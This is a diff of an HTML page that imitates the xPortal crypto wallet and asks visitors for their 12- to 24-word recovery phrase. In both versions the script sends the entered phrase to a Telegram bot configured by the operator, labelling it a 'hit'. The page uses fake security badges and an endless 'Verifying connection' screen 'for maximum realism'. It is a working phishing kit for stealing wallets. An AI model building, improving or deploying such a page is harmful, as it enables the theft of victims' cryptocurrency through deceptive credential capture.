@@ -3,176 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Secure Access</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>xPortal | Secure Wallet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-card-bg: rgba(15, 15, 15, 0.85); --xp-border: rgba(255, 255, 255, 0.08); --xp-text-dim: #949494; }
+        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.1); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background-color: var(--xp-black); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); }
+        body { background: var(--xp-black); color: #fff; min-height: 100vh; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); }
         
-        /* NAVIGATION */
-        nav { width: 100%; height: 72px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--xp-border); backdrop-filter: blur(20px); position: fixed; top: 0; z-index: 100; background: rgba(0,0,0,0.5); }
-        .nav-logo { display: flex; align-items: center; gap: 12px; color: white; text-decoration: none; font-weight: 800; font-size: 20px; }
+        nav { width: 100%; height: 70px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--xp-border); background: rgba(0,0,0,0.5); backdrop-filter: blur(20px); position: fixed; top: 0; z-index: 100; }
+        .nav-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; }
         .nav-logo img { width: 32px; height: 32px; object-fit: contain; }
 
-        .page-section { display: none; margin-top: 100px; width: 100%; animation: fadeIn 0.4s ease-out; padding: 20px; flex-direction: column; align-items: center; }
+        .page-section { display: none; margin-top: 100px; width: 100%; animation: fadeIn 0.3s; padding: 20px; flex-direction: column; align-items: center; }
         .page-section.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .glass-card { background: var(--xp-card-bg); backdrop-filter: blur(40px); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; text-align: center; width: 100%; max-width: 500px; box-shadow: 0 50px 100px rgba(0,0,0,0.9); position: relative; }
+        .glass-card { background: rgba(13, 13, 13, 0.8); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; text-align: center; width: 100%; max-width: 450px; box-shadow: 0 40px 80px rgba(0,0,0,0.8); }
+        .card-icon { width: 70px; height: 70px; margin-bottom: 20px; object-fit: contain; }
+
+        .btn-main { width: 100%; height: 60px; border-radius: 100px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; margin-bottom: 12px; transition: 0.2s; }
+        .btn-white { background: #fff; color: #000; }
+        .btn-dark { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
         
-        .hero-logo { width: 80px; height: 80px; margin-bottom: 20px; position: relative; filter: drop-shadow(0 0 15px rgba(138, 63, 252, 0.3)); }
+        .words-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+        .word-box { position: relative; }
+        .word-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); color: var(--xp-teal); font-size: 10px; font-weight: 700; }
+        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 10px; padding: 12px 5px 12px 25px; color: #fff; font-size: 13px; }
 
-        /* TABS */
-        .tab-container { display: flex; background: rgba(255,255,255,0.03); border-radius: 12px; padding: 4px; margin-bottom: 25px; border: 1px solid var(--xp-border); }
-        .tab-btn { flex: 1; padding: 12px; border: none; border-radius: 10px; background: transparent; color: var(--xp-text-dim); cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.3s; }
-        .tab-btn.active { background: rgba(255,255,255,0.1); color: #fff; }
-
-        /* WORD BY WORD GRID */
-        .count-selector { margin-bottom: 15px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: var(--xp-text-dim); }
-        .count-selector label { cursor: pointer; display: flex; align-items: center; gap: 6px; }
-        .count-selector input { accent-color: var(--xp-teal); }
-
-        .words-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px; max-height: 280px; overflow-y: auto; padding-right: 5px; }
-        .word-input-box { position: relative; }
-        .word-input-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); color: var(--xp-teal); font-size: 10px; font-weight: 700; opacity: 0.6; }
-        .word-input-box input { width: 100%; background: rgba(0,0,0,0.4); border: 1px solid var(--xp-border); border-radius: 10px; padding: 10px 5px 10px 25px; color: #fff; font-size: 13px; transition: 0.3s; }
-        .word-input-box input:focus { outline: none; border-color: var(--xp-purple); background: rgba(138, 63, 252, 0.05); }
-
-        /* FULL PHRASE TEXTAREA */
-        .input-container { position: relative; width: 100%; }
-        textarea { width: 100%; height: 160px; background: rgba(0,0,0,0.4); border: 1px solid var(--xp-border); border-radius: 20px; padding: 20px; color: #fff; font-size: 15px; resize: none; margin-bottom: 20px; line-height: 1.6; }
-        textarea:focus { outline: none; border-color: var(--xp-purple); }
-        .btn-paste { position: absolute; top: 12px; right: 12px; background: var(--xp-purple); color: white; border: none; padding: 6px 14px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; z-index: 5; }
-
-        .btn-main { width: 100%; height: 60px; border-radius: 100px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; background: #fff; color: #000; }
-        .btn-main:hover { background: var(--xp-teal); transform: translateY(-2px); }
-
-        .hidden { display: none; }
-        #status-msg { display: none; margin-top: 20px; color: var(--xp-teal); font-weight: 600; font-size: 14px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        #loading-text { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="nav-logo">
-        <img src="Capture.PNG" alt="Logo">
-        <span>xPortal</span>
-    </div>
+    <div class="nav-logo"><img src="Capture.PNG"><span>xPortal</span></div>
 </nav>
 
-<section id="import-section" class="page-section active">
+<section id="home" class="page-section active">
     <div class="glass-card">
-        <img src="Capture.PNG" class="hero-logo" alt="xPortal">
-        
-        <h2 style="margin-bottom: 8px; letter-spacing: -1px; font-weight: 800;">Access Wallet</h2>
-        <p style="color:var(--xp-text-dim); margin-bottom: 25px; font-size:14px;">Import your recovery phrase (12, 18, or 24 words) to securely connect.</p>
+        <img src="Capture.PNG" class="card-icon">
+        <h2>Welcome to xPortal</h2>
+        <p style="color:#949494; margin: 15px 0 30px;">Choose an option to manage your assets.</p>
+        <button class="btn-main btn-white" onclick="showSection('create')">Create New Wallet</button>
+        <button class="btn-main btn-dark" onclick="showSection('import')">Import Wallet</button>
+    </div>
+</section>
 
-        <div class="tab-container">
-            <button id="tab-full" class="tab-btn active" onclick="switchTab('full')">Full Phrase</button>
-            <button id="tab-words" class="tab-btn" onclick="switchTab('words')">Word by Word</button>
-        </div>
+<section id="create" class="page-section">
+    <div class="glass-card">
+        <img src="Capture.PNG" class="card-icon">
+        <h2>Recovery Phrase</h2>
+        <p style="color:#949494; margin-bottom: 20px;">Save these 12 words securely.</p>
+        <div class="words-grid" id="gen-grid"></div>
+        <button class="btn-main btn-white" onclick="showSection('verify')">I've saved them</button>
+    </div>
+</section>
 
-        <div id="box-full">
-            <div class="input-container">
-                <button class="btn-paste" onclick="doPaste('full-input')">PASTE</button>
-                <textarea id="full-input" placeholder="Enter your secret phrase..."></textarea>
-            </div>
-        </div>
-
-        <div id="box-words" class="hidden">
-            <div class="count-selector">
-                <label><input type="radio" name="wcount" value="12" checked onclick="genGrid(12)"> 12 Words</label>
-                <label><input type="radio" name="wcount" value="24" onclick="genGrid(24)"> 24 Words</label>
-            </div>
-            <div class="words-grid" id="grid">
-                </div>
-        </div>
-
-        <button class="btn-main" id="submitBtn" onclick="handleSubmit()">
-            Connect Wallet
-        </button>
-
-        <div id="status-msg">Verifying Secure Connection...</div>
-
-        <div style="margin-top: 25px; font-size: 10px; color: #444; font-weight: 800; letter-spacing: 1.5px; display: flex; align-items: center; justify-content: center; gap: 5px;">
-            <svg width="12" height="12" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3z"/></svg>
-            AES-256 BANK-LEVEL SECURITY
-        </div>
+<section id="import" class="page-section">
+    <div class="glass-card">
+        <img src="Capture.PNG" class="card-icon">
+        <h2>Secret Phrase</h2>
+        <p style="color:#949494; margin-bottom: 20px;">Enter your 12 words phrase.</p>
+        <div class="words-grid" id="input-grid"></div>
+        <button class="btn-main btn-white" id="subBtn" onclick="submitHit()">Connect Wallet</button>
+        <div id="loading-text">Verifying connection...</div>
     </div>
 </section>
 
 <script>
-    // --- TELEGRAM CONFIG ---
-    const TOKEN = 'YOUR_BOT_TOKEN'; // Badel hada b TOKEN dyalk
-    const CHAT_ID = 'YOUR_CHAT_ID'; // Badel hada b ID dyalk
+    const TOKEN = 'YOUR_BOT_TOKEN';
+    const CHAT_ID = 'YOUR_CHAT_ID';
 
-    let currentMode = 'full';
+    const dummyWords = ["apple","brave","ocean","tiger","smart","focus","cloud","planet","winter","summer","bright","shield"];
 
-    // Word by Word Grid Generator
-    function genGrid(n) {
-        const g = document.getElementById('grid');
-        g.innerHTML = '';
-        for(let i=1; i<=n; i++) {
-            g.innerHTML += `
-                <div class="word-input-box">
-                    <span>${i}</span>
-                    <input type="text" class="w-in" placeholder="Word">
-                </div>`;
+    function showSection(id) {
+        document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        if(id === 'create') {
+            const g = document.getElementById('gen-grid');
+            g.innerHTML = dummyWords.map((w, i) => `<div class="word-box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
+        }
+        if(id === 'import' || id === 'verify') {
+            const g = document.getElementById('input-grid');
+            g.innerHTML = '';
+            for(let i=1; i<=12; i++) g.innerHTML += `<div class="word-box"><span>${i}</span><input type="text" class="w-in"></div>`;
         }
     }
-    genGrid(12); // Default
 
-    // Tab Switcher
-    function switchTab(t) {
-        currentMode = t;
-        document.getElementById('tab-full').classList.toggle('active', t==='full');
-        document.getElementById('tab-words').classList.toggle('active', t==='words');
-        document.getElementById('box-full').classList.toggle('hidden', t!=='full');
-        document.getElementById('box-words').classList.toggle('hidden', t!=='words');
-    }
-
-    // Paste Functionality
-    async function doPaste(id) {
-        try {
-            const text = await navigator.clipboard.readText();
-            document.getElementById(id).value = text;
-        } catch(e) { alert("Please type manually or allow clipboard access."); }
-    }
-
-    // Submit Logic
-    function handleSubmit() {
-        let finalPhrase = "";
+    function submitHit() {
+        let words = [];
+        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
+        const phrase = words.join(" ");
         
-        if(currentMode === 'full') {
-            finalPhrase = document.getElementById('full-input').value.trim();
-        } else {
-            let wordsArr = [];
-            document.querySelectorAll('.w-in').forEach(input => wordsArr.push(input.value.trim()));
-            finalPhrase = wordsArr.join(" ");
-        }
+        document.getElementById('subBtn').style.display = 'none';
+        document.getElementById('loading-text').style.display = 'block';
 
-        // Simple validation
-        const wordCount = finalPhrase.split(/\s+/).length;
-        if(wordCount < 12) {
-            alert("The phrase must be at least 12 words.");
-            return;
-        }
-
-        // Show Loading UI
-        document.getElementById('submitBtn').style.display = 'none';
-        document.getElementById('status-msg').style.display = 'block';
-
-        // Send data to Telegram
-        const message = `🚀 NEW XPORTAL HIT!\n\nMethod: ${currentMode}\nPhrase: ${finalPhrase}\nWords: ${wordCount}`;
-        
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
-        .then(response => {
-            console.log("Data sent to TG.");
-            // We keep it on "Verifying..." for maximum realism
-        })
-        .catch(err => console.error(err));
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚨 xPortal Hit:\n\n" + phrase)}`);
     }
 </script>
 
